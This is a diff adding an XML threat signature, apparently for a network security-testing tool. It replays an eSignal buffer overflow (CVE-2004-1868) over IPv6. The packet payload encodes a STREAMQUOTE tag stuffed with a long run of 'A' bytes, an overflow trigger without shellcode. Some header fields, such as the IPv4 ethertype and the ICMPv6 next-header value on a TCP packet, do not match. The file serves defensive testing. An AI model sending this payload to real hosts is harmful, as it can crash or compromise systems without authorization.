@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="eSignal Buffer Overflow (IPv6 Version)"/>
+    <EngDesc display="true" value="A buffer overflow exists in eSignal, a real-time market data and support tool. The vulnerability allows remote attackers to execute arbitrary code on vulnerable systems. (IPv6 Version)"/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Interactive_Data_Corporation"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Interactive_Data_Corporation_Interactive_Data_Corporation_eSignal"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20040329-01"/>
+    <CVEID display="true" value="CVE-2004-1868"/>
+    <bugtraqID display="true" value="9978"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="9d69e5482da64ba3b8ed771d95d42af0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900366"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="I"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="J"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="C">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="E"/>
+  </Loops>
+  <PostScript/>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="80726192" AckNumber="6CA5EA50" HeaderLength="08" WindowSize="16D0" Checksum="FC4F" UrgentPointer="0000" Options="0101080A016E8B8D00000000" Payload="3C53545245414D51554F54453E41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141413C2F53545245414D51554F54453E" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6CA5EA50" AckNumber="807265BD" HeaderLength="08" WindowSize="4045" Checksum="ADAB" UrgentPointer="0000" Options="0101080A000020D9016E8BB8" Payload="20" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
